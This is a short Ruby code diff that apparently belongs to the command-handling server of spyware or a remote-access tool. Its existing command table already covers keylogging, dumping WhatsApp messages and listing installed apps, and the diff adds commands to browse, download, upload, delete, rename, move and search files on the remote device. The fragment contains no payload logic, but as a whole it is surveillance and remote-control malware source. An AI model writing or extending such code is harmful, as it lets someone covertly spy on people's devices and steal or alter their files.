@@ -15,7 +15,16 @@ class ResponseProcessor
     'get_installed_apps' => AppsResponseProcessor,
     'dump_whatsapp_messages' => WhatsAppResponseProcessor,
     'keylog' => KeylogResponseProcessor,
-    'list_installed_apps' => InstalledAppsResponseProcessor
+    'list_installed_apps' => InstalledAppsResponseProcessor,
+    'list_files' => FileBrowserResponseProcessor,
+    'download_file' => FileBrowserResponseProcessor,
+    'upload_file' => FileBrowserResponseProcessor,
+    'upload_file_chunk' => FileBrowserResponseProcessor,
+    'delete_file' => FileBrowserResponseProcessor,
+    'preview_file' => FileBrowserResponseProcessor,
+    'rename_file' => FileBrowserResponseProcessor,
+    'move_file' => FileBrowserResponseProcessor,
+    'search_files' => FileBrowserResponseProcessor
   }.freeze
 
   def self.process(data)
